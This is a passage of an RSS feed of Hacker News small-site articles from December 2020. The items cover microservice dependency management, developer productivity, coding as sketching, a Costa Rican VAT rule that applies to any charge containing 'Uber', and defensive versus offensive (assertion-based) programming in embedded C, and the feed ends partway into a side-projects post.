networking, and automate security is the perfect recipe for integration into
CI/CD pipelines!</p>
<p>If every service can be run consistently (e.g. with container platforms) and is
aware of its own dependencies, new environments can be provisioned for each
merge request and changes can be seamlessly promoted into staging and production
when merged into relevant branches. This means that every team can achieve
scalable
<a href="https://thenewstack.io/what-is-gitops-and-why-it-might-be-the-next-big-thing-for-devops/">GitOps</a>
for every developer and every new service added to the application.</p>
<h2 id="4-security"><a href="#4-security" aria-label="4 security permalink"></a>4. Security</h2>
<p>One of the risks introduced by microservice architectures is the need for each
service to expose APIs that broker access to their functionality. Since these
services live as separate processes, communication over a network is one of the
only ways for them to connect to each other and receive requests for processing.
This means that each new service exposes an interface that can be accessed by
others, and if developers aren't careful they can accidentally expose it to the
wrong parties.</p>
<p><img src="https://www.architect.io/images/blog/why-distributed-apps-need-dependency-management/declare-data-breach.webp" alt="Cloud Security"></p>
<p>Preventing accidental exposure of network interfaces is yet another area where
dependency management can provide support. With developers providing a
structured index of their own service's network dependencies, not only can we
automatically resolve those dependencies, but we can also enrich the environment
with the corresponding network policies required to lock it down – only services
that depend on each other can access each other. This structured approach
drastically reduces the need for developers to understand network security
tooling, and opens them up to create new services more freely.</p>
<h2 id="5-flexibility"><a href="#5-flexibility" aria-label="5 flexibility permalink"></a>5. Flexibility</h2>
<p>Another benefit of dependency management with respect to microservices and
distributed applications is flexibility. With developers capturing the details
of their immediate dependencies and associating them with their own services,
the resolver itself is free to instrument the relationships in unique ways in
each environment that gets deployed. Want to try out a different API gateway or
service mesh? Want to instrument distributed tracing by capturing ingress and
egress traffic from each service? With automation that can hook into the
dependency resolver, operators are free to experiment with new tools and configs
without any code changes to existing services or distractions for developers.</p>
<h2 id="why-doesnt-it-already-exist"><a href="#why-doesnt-it-already-exist" aria-label="why doesnt it already exist permalink"></a>Why doesn't it already exist?</h2>
<p>Dependency resolution would be an enormously powerful tool solution to enable
developers to collaborate and contribute to cloud-native applications, but can't
we use the vast number of package managers that already exist to help with
instrumentation? While it would be nice to use existing tools, resolving
dependencies for networked applications isn't the same as resolving the
relationships between libraries and binaries.</p>
<p>The download of code artifacts that fulfill dependency requirements for
libraries all happens at build-time to create one master binary/library.
Microservices however don't get bundled into single binaries and instead need to
be run as independent services and then connected to over a network. This means
that the resolution strategy has additional steps, and happens at an entirely
different lifecycle stage than regular libraries. Turns out, the earliest point
in an application lifecycle that we can properly resolve dependencies for
distributed applications is at deploy-time. It is at this point that we know
both the relationships between all services in the stack as well as the tooling
and details of the target environment needed to properly provision and connect
services.</p>
<p>To sum it up, it's hard to create a large scale resolver for network
dependencies, but doing so would provide enormous benefits to engineering teams
and the cloud community as a whole. If we're to properly navigate the growing
landscape of cloud-native tools, we'll need to learn from dependency management
practices of the past.</p></div></div></div>]]>
            </description>
            <link>https://www.architect.io/blog/why-distributed-apps-need-dependency-management</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509223</guid>
            <pubDate>Tue, 22 Dec 2020 18:07:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Small Difference in Developer Productivity Can Amplify over Time]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509084">thread link</a>) | @adamhearn
<br/>
December 22, 2020 | https://somehowmanage.com/2020/12/08/your-fastest-engineer-may-not-be-as-fast-as-you-think/ | <a href="https://web.archive.org/web/*/https://somehowmanage.com/2020/12/08/your-fastest-engineer-may-not-be-as-fast-as-you-think/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-331">

	

	
	<div>
		
<p>Small differences in the productivity of software developers on a team can easily magnify themselves over time.</p>



<p>On many software teams, one engineer seems significantly faster than the others. Now, in some cases, it’s because that engineer is cutting corners left and right. They get stuff done, but they cause damage. They’re a <a href="https://www.linkedin.com/pulse/tactical-tornado-jacob-dreyer/">tactical tornado</a>.</p>



<p>Let’s assume your fastest engineer isn’t that type. They put out good code. It’s possible that they’re not actually as fast as you think. It turns out that even a marginal advantage for one engineer can translate into significant speed differences.</p>



<p>Let’s imagine a simple team of two engineers, Amy and Bob. All things equal, Amy would be 10% as fast as Bob. And by all things equal, I mean they’d produce the same quality of code, Amy would just produce 10% more. This slight speed advantage could be because she’s naturally faster, or because she joined the team earlier and hence has more context on the code.</p>



<p>That 10% difference can actually translate to a pretty large difference in output. Initially, Amy produces 10% more code. Now Bob has to increase the time he spends doing code reviews of Amy’s code, and just generally keeping up with Amy’s changes so he has context and can make the changes he needs to make. Which means he has less time to write code, which frees up Amy to be even more effective, which increases her output yet again.</p>



<p>Over time, this is amplified. Amy is spending most of her time writing code. Bob is spending most of his reviewing and keeping up. Amy’s slight advantage turns into a much larger one. Other colleagues start to view her as the go-to person, and wonder why Bob is falling behind.</p>



<p>A good engineering manager or senior engineer can detect when that’s happening and try to correct the balance. But often the team kind of settles into a mode where Amy is assumed to be better and more productive and everything is funneled to her.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://somehowmanage.com/2020/12/08/your-fastest-engineer-may-not-be-as-fast-as-you-think/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509084</guid>
            <pubDate>Tue, 22 Dec 2020 17:54:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coding as a Tool of Thought]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509078">thread link</a>) | @todsacerdoti
<br/>
December 22, 2020 | https://surfingcomplexity.blog/2020/12/21/coding-as-a-tool-of-thought/ | <a href="https://web.archive.org/web/*/https://surfingcomplexity.blog/2020/12/21/coding-as-a-tool-of-thought/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>With apologies to <a href="https://www.eecg.utoronto.ca/~jzhu/csc326/readings/iverson.pdf">Ken Iverson</a>.</p>



<blockquote><p>Architects draw detailed plans before a brick is laid or a nail is hammered. Programmers and software engineers don’t. Can this be why houses seldom collapse and programs often crash?</p><p>Blueprints help architects ensure that what they are planning to build will work. “Working” means more than not collapsing; it means serving the required purpose. Architects and their clients use blueprints to understand what they are going to build before they start building it.</p><p>But few programmers write even a rough sketch of what their programs will do before they start coding.</p><cite>Leslie Lamport, <a href="https://www.wired.com/2013/01/code-bugs-programming-why-we-need-specs/">Why We Should Build Software Like We Build Houses</a></cite></blockquote>



<blockquote><p>“My instinct is to go right to the board. I’m very graphic oriented. I can’t talk more than ten minutes without I [sic] start drawing pictures when we’re talking about the things I do. Even if I’m talking sports, I invariably start diagramming what’s going on. I feel comfortable with it or find it very effective.”</p><p>This designer, like the newly promoted engineer at Selco who fought to get her drafting board back, is pointing out his dependence on the visual process, of drawing both to communicate and to think out the initial design. He also states that <strong>the visual and manual thought process of drawing precedes the formulation of the written specifications for the project</strong>. Like the Selco designers and those at other sites, he emphasized the importance of drawing processes to work out ideas. [emphasis added]</p><cite>Kathryn Henderson, <a href="https://mitpress.mit.edu/books/line-and-paper">On Line and On Paper: Visual Representations, Visual Culture, and Computer Graphics in Design Engineering</a></cite></blockquote>



<p>The quote above by Kathryn Henderson illustrates how mechanical engineers use the act of drawing to help them work on the design problem. By generating sketches and drawings, they develop a better understanding of the problem they trying to solve. They use drawing as a tool to help them think, to work through the problem.</p>



<p>As software engineers, we don’t work in a visual medium in the way that mechanical engineers do. And yet, we also use tools to help us think through the problem. It just so happens that the tool we use is code. I can’t speak for other developers, but I certainly use the process of writing code to develop a deeper understanding of the problem I’m trying to solve. As I solve parts of the problem with code, my mental model of the problem space and solution space develops throughout the process.</p>



<p>I think we use coding this way (I certainly do), because it feels to me like the fastest way to evolve this knowledge. If I had some sort of equivalent mechanism for sketching that was faster than coding for developing my understanding, I’d use it. But I know of no mechanism that’s actually faster than coding that will let me develop my understanding of the solution I’m working on. It just so happens that the quickest solution, code, is the same medium as the artifact that will ultimately end up in production. A mechanical engineer can never ship their sketches, but we can ship our code.</p>



<p>And this is a point that I think Leslie Lamport misses. I’m personally familiar with a number of different techniques for modeling in software, including TLA+, Alloy, statecharts, and decision tables. I’ve used them all, they are excellent tools for reasoning about the complexity of the system. But none of these tools really fulfill the role that sketching does for mechanical engineers (although Alloy’s fast feedback for incremental model building is a nice step in this direction).</p>



<p>TLA+ in particular is a wonderful tool. I’ve used it for things like <a href="https://github.com/lorin/tla-linearizability">understanding the linearizability paper</a>, <a href="https://github.com/lorin/epidemic-register">beating the CAP theorem</a>, <a href="https://surfingcomplexity.blog/2017/10/16/the-tortoise-and-the-hare-in-tla/">finding cycles in linked lists</a>,  <a href="https://surfingcomplexity.blog/2014/06/04/crossing-the-river-with-tla/">solving the river crossing problem</a>, and <a href="https://github.com/hwayne/lets-prove-leftpad/tree/master/tlaps">proving leftpad</a>. But if you’re looking for an analogy in mechanical engineering, TLA+ is much closer to finite element analysis than it is to sketches.</p>



<p>Developers jump to coding not because they are sloppy, but because they have found it to be the most effective tool for <em>sketching</em>, for thinking about the problem and getting quick feedback as they construct their solution. And constructing a representation to develop a better understanding using the best tools they have available for the job to get quick feedback is what engineers do.</p>
	</div><div>
			<!-- .entry-auhtor -->
		<p><strong>Published</strong>
			<time datetime="2020-12-21T20:26:47-08:00">December 21, 2020</time><time datetime="2020-12-21T20:27:30-08:00">December 21, 2020</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://surfingcomplexity.blog/2020/12/21/coding-as-a-tool-of-thought/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509078</guid>
            <pubDate>Tue, 22 Dec 2020 17:54:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Costa Rica will tax any service including '%Uber%' in its name (Spanish)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25508933">thread link</a>) | @estebarb
<br/>
December 22, 2020 | https://observador.cr/hacienda-cobra-doble-iva-a-pedidos-de-uber-eats-desde-este-18-de-diciembre/ | <a href="https://web.archive.org/web/*/https://observador.cr/hacienda-cobra-doble-iva-a-pedidos-de-uber-eats-desde-este-18-de-diciembre/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="td_uid_76_5fe61b46e9397">

<div>
<div id="ra-player" data-skin="https://assets.sitespeaker.com/embed/skins/default">
<p><img src="https://assets.sitespeaker.com/embed/skins/default/play-icon.png"> Escuchar este artículo</p>
</div>
<p><audio id="ra-audio" data-lang="es-US" data-voice="Amazon Miguel" data-key="3806cf2c5fb46be1c8b9deab313b2f56"></audio><br>
<span><span>Tiempo de Lectura: </span> <span>4</span> <span>minutos</span></span>Desde este 18 de diciembre, los envíos de comida que solicite por medio de la plataforma Uber Eats pagados con tarjeta, tendrán un cobro adicional del 13% en Impuesto al Valor Agregado (IVA), aunque el restaurante ya haya incluido dicho tributo en el pedido.</p>
<p>Esto significa que para una compra de ¢5.000 más un servicio de entrega de ¢1.700, la persona pagaría un total de ¢1.605 de IVA. Lo correcto sería ¢871 sin el cobro duplicado.</p>
<p>Sin embargo, la semana pasada Costa Rica agregó a Uber a una lista de alrededor de 30 servicios digitales transfronterizos a los que las tarjetas, tanto de débito como de crédito, deben hacer el cobro del impuesto.</p>
<p><strong>OBSERVE MÁS: <a href="https://observador.cr/doble-impuesto-tributacion-cobro-iva-indebido-a-viajera-tica-por-reservacion-en-mexico/">¿Doble impuesto? Tributación cobró IVA indebido a viajera tica por reservación en México</a></strong></p>
<p>Giovanni Tencio, director de Inteligencia de la Dirección General de Tributación, explicó que cualquier transacción que incluya la palabra “Uber” estaría entonces expuesta a un cobro adicional del 13% sobre el monto total.</p>
<p>“Uber Eats queda incluido indirectamente. La lista dice que se debe aplicar la percepción en toda aquella transacción en donde aparezca esa frase (Uber). De hecho hay una circunstancia que si una empresa tiene dentro de su nombre la palabra tuberías, podría provocar que también se le cobre IVA por venir incluidas las cuatro letras Uber juntas”, explicó.</p>
<p>En el caso de Uber Eats, uno de los nombres de facturación es “UB EATS COSTA RICA HELP.UBER.COM”. Desde el viernes, está apareciendo el cobro separado del IVA a los pagos por medio de tarjetas con este nombre.</p>
<p>Uber Eats no respondió a una consulta de <strong>El Observador</strong> para el cierre de esta nota. Tampoco fue posible corroborar si usa otros nombres para facturar que eviten el doble cobro.</p>
<p>El cliente, en estos casos, se entera del cobro del IVA por medio de su estado de cuenta: debe reflejar por un lado el monto de la compra del servicio digital y por otro, el IVA asociado a esa compra.</p>
<figure id="attachment_195506" aria-describedby="caption-attachment-195506"><img loading="lazy" src="https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31.png" alt="Doble IVA en Uber Eats" width="912" height="166" srcset="https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31.png 912w, https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31-300x55.png 300w, https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31-768x140.png 768w, https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-09.28.31-696x127.png 696w" sizes="(max-width: 912px) 100vw, 912px"><figcaption id="caption-attachment-195506">Desde este 18 de diciembre, el estado de cuenta de un tarjetahabiente refleja un cobro total a través de Uber Eats así como un pago adicional del 13% del IVA cobrado sobre el total de cada transacción. (Cortesía)</figcaption></figure>
<h3>Doble IVA</h3>
<p>Tencio explicó que Uber Eats no incluye IVA sobre el monto del servicio de entrega. Más bien, solo la comida incluye el pago de IVA, cuando es un pedido de un restaurante formal.</p>
<p>Como ejemplo, Tencio puso un ‘combo’ de ¢5.000 que pagaría 13% del IVA en el restaurante, es decir, ¢650. En este caso, el restaurante cobra ¢5.650.</p>
<p>Sin embargo, la plataforma además incluye ¢1.700 por el servicio de entrega, al que no le aplica el IVA. Entonces, esta persona pagaba un total de ¢7.350 por medio de la plataforma, antes del 18 de diciembre.</p>
<p>Pero, a partir de esa fecha, la tarjeta le cobra el 13% sobre este monto total, es decir, otros ¢955,5 adicionales del IVA.</p>
<figure id="attachment_195496" aria-describedby="caption-attachment-195496"><img loading="lazy" src="https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-12.50.17.png" alt="Doble IVA" width="582" height="337" srcset="https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-12.50.17.png 582w, https://elobservadorcr.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-21-at-12.50.17-300x174.png 300w" sizes="(max-width: 582px) 100vw, 582px"><figcaption id="caption-attachment-195496">Ejemplo de un cobro duplicado del IVA, según Giovanni Tencio, director de Inteligencia de la Dirección General de Tributación. (Cortesía Tributación)</figcaption></figure>
<p>Sumando estos dos cobros, la persona entonces termina pagando ¢8.305,5 incluyendo ¢1.605 de IVA. Es decir, el impuesto representa un 24% sobre lo que consumió.</p>
<p>Lo correcto sería aplicar el IVA sobre el costo de la comida y sobre el servicio <em>express</em>. En este caso correspondería a un IVA de ¢871 sobre el total de ¢6.700 de ambos rubros, lo que suma ¢7.571.</p>
<p>Tencio aceptó que el consumidor tendría el derecho de que le devuelvan elcobro duplicado del IVA. En este caso, ¢734,50.</p>
<h3>Efecto “Indeseado”</h3>
<p>Este resulta ser el efecto “indeseado” del cobro del impuesto que recién empiezan a introducir algunos países en Latinoamérica, según Tencio.</p>
<p>Los problemas se evitarían si las plataformas se registran como contribuyentes en Costa Rica, explicó. Al cobrar ellas el impuesto, pueden distinguir entre servicios fuera de Costa Rica y transacciones que ya incluyen IVA para evitar los cobros indebidos.</p>
<p>“Esperaríamos que la inclusión en la lista pueda ser aliciente para que estas compañías se inscriban porque claramente esto les da una afectación (…) Le quita competitividad a la plataforma”, según Tencio.</p>
<p>Las empresas que se vayan inscribiendo se eliminarían o no se agregarían a la lista de servicios transfronterizos. Sin embargo, por el momento solo Amazon, la plataforma de datos financieros Bloomberg y la empresa de software McAfee han avanzado en el proceso de inscripción.</p>
<p><strong>OBSERVE MÁS:&nbsp;<a href="https://observador.cr/taxistas-reaccionan-en-contra-de-cobro-de-iva-a-uber-y-didi-por-que/">Taxistas reaccionan en contra de cobro de IVA a Uber y Didi</a></strong></p>
<p>Mientras tanto, Tributación considera que no se justifica dar una “especie de exención” al impuesto por la complejidad del doble cobro, según Tencio.</p>
<p>“Uber como compañía tiene la solución a esto: regístrese, ofrezca las garantías que se requieren, que en realidad son mínimas, y cobre usted el IVA”, dijo.</p>
<p>Desde introducir el impuesto sobre una primera lista de servicios el 1 de octubre, se han recaudado alrededor de ¢2.500 millones. Con la inclusión de los nuevos operadores a partir del 18 de diciembre, incluyendo Uber, espera además un “salto muy amplio”, agregó.</p>

<h3>Afectación a consumidores</h3>
<p>Mientras tanto, Tencio señaló que Tributación pretende simplificar el proceso de devolución de cobros indebidos a los consumidores.</p>
<p>En noviembre, Tributación sacó en consulta un resolución para simplificar la tramitología interna que espera avanzar en el 2021.</p>
<p>Específicamente, pretende evitar que primero se tenga que verificar las deudas por otros impuestos de la persona, para hacer una “compensación” del impuesto.</p>
<p>Para montos pequeños, es posible que se tramite con el comprobante que emite la plataforma y la copia del estado de cuenta donde aparece el cobro.</p>
<p>Mientras que, montos grandes, es posible que se deba hacer la consulta al banco que verifique que la transacción es legitima, explicó Tencio.</p>
<blockquote data-secret="VcaM5OjXgW"><p><a href="https://observador.cr/tributacion-espera-que-amazon-empiece-a-cobrar-iva-a-servicios-digitales-directamente-en-enero/">Tributación espera que Amazon empiece a cobrar directamente el IVA a servicios digitales en enero</a></p></blockquote>

<hr>
<h4>Traducir artículo</h4>











</div></div></div>]]>
            </description>
            <link>https://observador.cr/hacienda-cobra-doble-iva-a-pedidos-de-uber-eats-desde-este-18-de-diciembre/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508933</guid>
            <pubDate>Tue, 22 Dec 2020 17:41:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Defensive Programming]]>
            </title>
            <description>
<![CDATA[
Score 98 | Comments 42 (<a href="https://news.ycombinator.com/item?id=25508896">thread link</a>) | @tyhoff
<br/>
December 22, 2020 | https://interrupt.memfault.com/blog/defensive-and-offensive-programming | <a href="https://web.archive.org/web/*/https://interrupt.memfault.com/blog/defensive-and-offensive-programming">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <p>One of the worst things about embedded development (especially in C) is
receiving a return value of <code>-1</code> or <code>unknown_error</code> from a function, with no
other information about why the failure took place. It provides no information
about where the error bubbled up from!</p>

<p>We’ve all been here as embedded developers, bringing up new boards, drivers,
modules, and applications, wondering why and how we got into this mess. Root
causing these issues is like peeling an onion: each layer we dig through while
debugging, we smile a bit less and a few more tears are shed. These sorts of
issues are often a result of developer error, either calling functions out of
order, at the wrong time, or with incorrect arguments. They could also be
because the system was in a bad state, such as out of memory or deadlocked.</p>

<p>The firmware <em>knows</em> there is an issue, and it likely knows <em>what the issue is</em>,
but yet it doesn’t help solve the issue. The software was built with “Defensive
Programming” practices in mind, which allows for the firmware to keep running
even when incorrect behavior occurs.</p>

<p>Usually, I would prefer that the firmware crash, print a useful error, and guide
me exactly to where the issue is. This the guiding principle of “Offensive
Programming”, which goes one step further than “Defensive Programming”.</p>

<!-- excerpt start -->

<p>In this article, we’ll dive into what defensive and offensive programming are,
where defensive programming falls short, how developers should think about using
them within embedded systems, and how the techniques of offensive programming
can surface bugs and help developers root cause them immediately at runtime.</p>

<!-- excerpt end -->

<p>By taking defensive and offensive programming to the extreme, you’ll be able to
track down those 1 in 1,000-hour bugs, efficiently root cause them, and keep
your end-users happy. And, as a bonus, keep your sanity.</p>

<p>Like Interrupt? <a href="https://go.memfault.com/interrupt-subscribe" target="_blank">Subscribe</a> to get our latest posts straight to your mailbox.</p>



<h2 id="defensive-programming">Defensive Programming</h2>

<p>Defensive programming is the practice of writing software to enable continuous
operation after and while experiencing unplanned issues. A simple example is
checking for <code>NULL</code> after calling <code>malloc()</code>, and ensuring that the program
gracefully handles the case.</p>

<div><div><pre><code><span>void</span> <span>do_something</span><span>(</span><span>void</span><span>)</span> <span>{</span>
  <span>uint8_t</span> <span>*</span><span>buf</span> <span>=</span> <span>malloc</span><span>(</span><span>128</span><span>);</span>
  <span>if</span> <span>(</span><span>buf</span> <span>==</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>// handle this gracefully!</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Defensive programming sounds nice, and it is nice! The firmware that we write
should never catastrophically fail due to unforeseen circumstances if we don’t
want it to.</p>

<p>Defensive programming really shines when interacting directly with hardware,
proprietary libraries, and external inputs that we don’t have direct control
over. Hardware may have glitches or behave differently in various environments,
heavyweight libraries often are riddled with bugs, and the outside world will
send whatever it wants over communication protocols.</p>

<p>As with most things, defensive programming can be abused and the benefits become
outweighed by the negatives. If many modules are layered on top of one another,
each using defensive programming techniques, bugs can and will be created, lost,
and/or obscured.</p>

<h3 id="problems-with-defensive-programming">Problems with Defensive Programming</h3>

<p>The key to defensive programming is to use it at the exterior interfaces of your
firmware. There should be a thin but sturdy wall of defensive programming
between the outside world and hardware, and then the majority of your code
inside the walls should be more aggressively checking for errors and yelling at
developers when they do the wrong thing.</p>

<p>
  <img width="600" src="https://interrupt.memfault.com/blog/img/defensive-and-offensive-programming/internal-software.png" alt="internal-software">
  If code paths originate from or pass through the red zones, then defensive programming is a good approach.
</p>

<p>For instance, let’s assume we have an internal function,
<code>hash32_djb2(const char *str, size_t len)</code>, which takes in the string we should
hash and a length. This function is <strong>never</strong> going to be directly used by any
external consumers, which leaves only internal developers.</p>

<p>By having a check and return value like the following:</p>

<div><div><pre><code><span>uint32_t</span> <span>hash32_djb2</span><span>(</span><span>const</span> <span>char</span> <span>*</span><span>str</span><span>,</span> <span>int</span> <span>len</span><span>)</span>
<span>{</span>
  <span>if</span> <span>(</span><span>str</span> <span>==</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>// Invalid argument</span>
    <span>return</span> <span>0</span><span>;</span>
  <span>}</span>
  <span>...</span>
</code></pre></div></div>

<p>You are only shooting yourself and your fellow developers in the feet. If any
developer passes a <code>NULL</code> string to this function, it will return <code>0</code> and be
stored as a valid hash!</p>

<p>The <code>NULL</code> string argument is likely the developer’s own bug, and they should
immediately become aware of the bug, or else it might slip into production.</p>

<p>This practice of writing code to aggressively surface errors is what is known as
“Offensive” Programming.
(<a href="https://www.merriam-webster.com/dictionary/offensive" target="_blank">Merriam Webster definition #1</a>,
“making attack”)</p>

<h2 id="offensive-programming">Offensive Programming</h2>

<p>Offensive programming, although seemingly opposite in word choice, actually
expands upon defensive programming and takes it one step further. Instead of
just accepting that <code>malloc()</code> can fail, software with offensive programming in
mind might assert that <code>malloc()</code> <em>never</em> fails. If a <code>malloc()</code> call does fail,
the software fatally assert, print enough information for the developer to root
cause the issue or capture a core dump, and then reset it back to a known
working state.</p>

<p>In embedded systems, where the entire stack from hardware to software is often
built and controlled by a single organization, any bug is the responsibility of
the engineers in that organization to root cause and fix. Offensive programming
can be a useful approach to surface bugs that might otherwise take weeks to
reproduce or never be found.</p>

<p>Offensive programming can take many forms inside of software, but the most
common way is to use
<a href="https://interrupt.memfault.com/blog/asserts-in-embedded-systems">assertions</a> liberally
and creatively against developer errors and system state behavior.</p>

<p>Let’s run through a few hypothetical situations and how you could use offensive
programming. If your embedded system is experiencing:</p>

<ul>
  <li>
<strong>Performance issues</strong> - such as the GUI freezing or slow response times to
button presses, you can use
<a href="https://interrupt.memfault.com/blog/firmware-watchdog-best-practices">watchdogs</a> or
timers and assertions to crash the system when the system stalls so that a
developer can figure out what exactly was consuming CPU time.</li>
  <li>
<strong>Memory issues</strong> - such as high stack usage, no free heap memory, or
excessive fragmentation, trigger a crash of the system when these states are
detected and capture the relevant parts for analysis by a developer to figure
out where the system went sideways. It’s rarely the final call to <code>malloc()</code>
or the highest function in the stack that pushes the system over the edge, but
everything that led up to it.</li>
  <li>
<strong>Locking issues</strong> - set a low-ish timeout (5 seconds) on RTOS functions, such
a <code>mutex_lock</code> and <code>queue_put</code>. Setting a low timeout will cause the system to
crash if the operation did not succeed in the allotted time, again allowing a
developer to further inspect what was the root issue. You can also choose to
spin indefinitely and have the watchdog <a href="https://interrupt.memfault.com/blog/firmware-watchdog-best-practices">clean
up</a>.</li>
</ul>

<p>This is just scratching the surface of offensive programming techniques, but I
hope you now have an idea of what this article is all about!</p>

<h3 id="benefits-of-offensive-programming">Benefits of Offensive Programming</h3>

<p>You might be asking why you should instrument your code and firmware with a
bunch of asserts, timers, watchdogs, and coordinated faults, and that’s a
reasonable question. Software crashes on an embedded system don’t just take down
a thread, but often the entire system as well.</p>

<p>There are two sides to this double-edged sword.</p>

<p>On one hand, when the device experiences unforeseen issues, you can leave the
system running in an undefined and unpredictable state. Maybe the heap is out of
memory, or the system failed to put a critical event in a queue and we’ve
dropped data, or maybe a thread has deadlocked and there is no automated
recovery mechanism. Some devices don’t even have power buttons and need to be
manually unplugged or the batteries pulled out!</p>

<p>On the other hand, devices in an unintended state are essentially broken devices
and should be reset. If the device was out of heap, it likely isn’t going to
recover and there exists a leak. If a thread has deadlocked, it also isn’t going
to recover. Not to mention, running in an undefined state leaves firmware open
to security holes and is exactly what we want to avoid.</p>

<p>On top of preventing your firmware from running in an unpredictable state,
triggering asserts and faults at the exact moment of the bug helps developers
track down these issues! If your devices are connected to a debugger while an
assert or fault is hit, or you have core dump instrumentation, you can reap the
following benefits:</p>

<ul>
  <li>
<strong>Quicker bug fixes</strong> - If the system is halted or a core dump is captured
when an assert is hit, the developer can get access to backtraces, registers,
function arguments, and system state such as the heap, lists, and queues. With
all this information, developers can root cause issues more quickly.</li>
  <li>
<strong>Faster development</strong> - Writing a new piece of code that integrates into
multiple modules can be tricky if there are bugs or assumptions in the modules
you are integrating with. By having assertions and OffP practices in the
surrounding layers, if a developer does anything misaligned with the API
specs, the system will immediately alert the developer. It’s better than
tracking down what <code>-3</code> or <code>unknown_error</code> means and how it bubbled up through
the system.</li>
  <li>
<strong>Awareness of prevalence</strong> - Developers don’t notice bugs unless they are
obvious or dropped in their inbox as a bug report. By forcing the software to
reset, awareness of these unknown bugs is increased and developers can more
easily understand how often they are occurring.</li>
  <li>
<strong>Returning system to sane state</strong> - If your comms thread is deadlocked, no
data will be sent from your device to the outside world, making your device a
brick until a user manually resets it. By resetting the device, you are more
likely to put the device back into a functioning state. Most embedded devices
have very quick reboot times, so it isn’t a huge deal.</li>
</ul>

<h2 id="offensive-programming-in-practice">Offensive Programming in Practice</h2>

<p>Let’s dig into some concrete examples of bugs we can find using offensive
programming practices.</p>

<h3 id="argument-validation">Argument Validation</h3>

<p>If a developer tries to use an API and passes invalid arguments into the</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interrupt.memfault.com/blog/defensive-and-offensive-programming">https://interrupt.memfault.com/blog/defensive-and-offensive-programming</a></em></p>]]>
            </description>
            <link>https://interrupt.memfault.com/blog/defensive-and-offensive-programming</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508896</guid>
            <pubDate>Tue, 22 Dec 2020 17:38:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I side project]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508810">thread link</a>) | @thesephist
<br/>
December 22, 2020 | https://thesephist.com/posts/how-i-side-project/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/how-i-side-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>This post started out as a long-form response to this tweet by Raj Kunkolienkar:</p>
<blockquote data-lang="en"><p lang="en" dir="ltr">Question to all the side project machines that I follow (with much respect) : what framework / setup / infrastructure / tools do you use to push out ideas to MVP so quickly?<a href="https://twitter.com/kognise?ref_src=twsrc%5Etfw">@kognise</a> <a href="https://twitter.com/thesephist?ref_src=twsrc%5Etfw">@thesephist</a> <a href="https://twitter.com/jajoosam?ref_src=twsrc%5Etfw">@jajoosam</a></p>— Raj Kunkolienkar 🚀 (@kunksed) <a href="https://twitter.com/kunksed/status/1130681972794175490?ref_src=twsrc%5Etfw">May 21, 2019</a></blockquote>

<p>… but then, I got busy, a few weeks passed, and it took a while for me to get back to it. On the upside, I have a new place for my ramblings now, which is <a href="https://dotink.co/">dotink.co</a>. It’s meant to be a more technical blog for when I want to talk more about software and design, but we’ll see how things go.</p>
<h2 id="side-projects">Side projects</h2>
<p>Over the last year, it seems like I’ve developed a habit of working on and releasing a large number of side projects, from the mundane (like <a href="https://thesephist.github.io/blocks.css/">the blocks.css library</a>) to the interesting (like <a href="https://soundsfromplaces.surge.sh/">Sounds from Places</a>) to the technical (like <a href="https://github.com/thesephist/ink">making a new programming language</a>). Everybody’s process and working style is different, but I thought it may be interesting to share how I think about side projects, and go from question to idea to execution to promotion.</p>
<p>For me, a side project is always some mixture of learning something new, fixing some problem I have in my life, or making something that I wish existed in the world, but doesn’t. I usually first get the idea for a project from needing to scratch some itch in my life or from an idea someone tosses out, but I let it simmer on my to-do list for a while before deciding that it’s worth spending some time on it to make it real.</p>
<h3 id="ideas">Ideas</h3>
